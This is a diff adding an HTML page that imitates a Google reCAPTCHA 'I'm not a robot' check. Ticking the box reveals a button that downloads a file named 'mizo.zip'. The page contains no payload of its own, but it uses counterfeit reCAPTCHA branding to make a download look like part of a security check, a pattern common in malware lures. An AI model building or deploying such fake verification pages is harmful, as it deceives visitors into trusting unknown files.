@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <style>
+        :root {
+            --captcha-gray: #f9f9f9;
+            --captcha-border: #d3d3d3;
+            --google-blue: #4a90e2;
+        }
+
+        body {
+            font-family: "Roboto", Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f1f1f1;
+            margin: 0;
+        }
+
+        /* The main CAPTCHA box */
+        .captcha-container {
+            background-color: var(--captcha-gray);
+            border: 1px solid var(--captcha-border);
+            border-radius: 3px;
+            width: 300px;
+            padding: 10px;
+            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .captcha-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            width: 100%;
+            height: 74px;
+        }
+
+        .checkbox-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-left: 10px;
+        }
+
+        /* Custom Checkbox Styling */
+        input[type="checkbox"] {
+            width: 24px;
+            height: 24px;
+            cursor: pointer;
+        }
+
+        .label-text {
+            font-size: 14px;
+            color: #555;
+        }
+
+        .logo-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-right: 10px;
+        }
+
+        .logo-section img {
+            width: 32px;
+            margin-bottom: 2px;
+        }
+
+        .logo-section span {
+            font-size: 8px;
+            color: #9b9b9b;
+        }
+
+        /* The hidden download button */
+        #download-area {
+            display: none;
+            margin-top: 15px;
+            width: 100%;
+            border-top: 1px solid #eee;
+            padding-top: 15px;
+            text-align: center;
+        }
+
+        .btn-verify {
+            background-color: var(--google-blue);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+            text-transform: uppercase;
+            font-size: 13px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .btn-verify:hover {
+            background-color: #357abd;
+        }
+    </style>
+</head>
+<body>
+
+<div class="captcha-container">
+    <div class="captcha-row">
+        <div class="checkbox-section">
+            <input type="checkbox" id="notRobot" onclick="toggleDownload()">
+            <span class="label-text">I'm not a robot</span>
+        </div>
+        <div class="logo-section">
+            <!-- This is just a placeholder for the CAPTCHA icon look -->
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="#4a90e2">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/>
+            </svg>
+            <span>reCAPTCHA</span>
+            <span>Privacy - Terms</span>
+        </div>
+    </div>
+
+    <!-- This section appears only after checking the box -->
+    <div id="download-area">
+        <button class="btn-verify" onclick="initiateDownload()">Download Files</button>
+    </div>
+</div>
+
+<script>
+    function toggleDownload() {
+        const checkbox = document.getElementById('notRobot');
+        const downloadArea = document.getElementById('download-area');
+        
+        if (checkbox.checked) {
+            downloadArea.style.display = 'block';
+        } else {
+            downloadArea.style.display = 'none';
+        }
+    }
+
+    function initiateDownload() {
+        // Change 'archive.zip' to your actual file name
+        const fileName = 'mizo.zip';
+        const link = document.createElement('a');
+        link.href = fileName;
+        link.download = fileName;
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    }
+</script>
+
+</body>
+</html>
